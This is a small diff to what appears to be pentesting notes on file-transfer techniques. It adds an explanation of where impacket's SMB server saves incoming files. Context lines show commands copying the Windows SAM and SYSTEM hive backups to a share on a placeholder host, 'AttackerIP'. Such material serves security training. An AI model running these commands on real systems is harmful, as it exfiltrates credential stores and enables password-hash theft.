@@ -62,6 +62,8 @@ copy C:\Windows\Repair\SAM \\AttackerIP\kali\
 copy C:\Windows\Repair\SYSTEM \\AttackerIP\kali\
 ```
 
+**Note:** The files are stored in the folder where the shell execute the command not in the impacket folder or kali folder. As example, If you execute the command "sudo python3 /opt/impacket/examples/smbserver.py kali ." from the /home/kali/test/ folder, the files will be stored inside.
+
 # Linux Methods
 
 #### Curl
